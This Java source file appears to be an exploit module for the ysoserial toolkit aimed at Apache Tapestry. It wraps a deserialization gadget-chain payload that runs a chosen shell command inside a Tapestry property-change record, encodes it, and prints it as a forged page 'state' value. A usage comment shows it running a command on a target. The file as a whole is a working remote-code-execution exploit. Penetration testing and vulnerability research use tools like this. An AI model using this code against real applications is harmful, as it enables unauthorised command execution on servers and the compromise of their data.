package ysoserial.exploit;

import org.apache.commons.codec.binary.Base64;
import org.apache.tapestry.record.PersistentPropertyDataEncoderImpl;
import org.apache.tapestry.record.PropertyChangeImpl;
import org.apache.tapestry.util.io.CompressedDataEncoder;
import ysoserial.payloads.ObjectPayload;

import java.io.ByteArrayOutputStream;
import java.io.ObjectOutputStream;
import java.io.OutputStream;
import java.net.*;
import java.util.ArrayList;
import java.util.Arrays;
import java.util.List;
//java -cp /target/ysoserial-0.0.6-SNAPSHOT-all.jar ysoserial.exploit.Tapestry CommonsCollections5 'touch /tmp/foo'

public class Tapestry {

    public static void main ( String[] args ) {

        if ( args.length < 2 ) {
            System.err.println(Tapestry.class.getName() + " <payload_type> <payload_arg>");
            System.exit(-1);
        }
        //CommonsCollections1Sleep 10000
        final Object payloadObject = ObjectPayload.Utils.makePayloadObject(args[ 0 ], args[ 1 ]);
        List<Object> newChanges = new ArrayList<>();
        System.out.print(newChanges.size());
        System.out.println("Payload gen:");
        String payload="";
        PersistentPropertyDataEncoderImpl propertyDataEncoder = new PersistentPropertyDataEncoderImpl();
        propertyDataEncoder.setClassResolver(new org.apache.hivemind.impl.DefaultClassResolver());
        try {
            PropertyChangeImpl impl1 = new PropertyChangeImpl("bar", "foo", payloadObject);
            newChanges.add(impl1);


            payload = propertyDataEncoder.encodePageChanges(newChanges);


            System.out.println("Pass the following value as state value:");
            System.out.println(payload);


               }
        catch ( Exception e ) {
            e.printStackTrace(System.err);
        }
        ObjectPayload.Utils.releasePayload(args[0], payloadObject);

    }
}
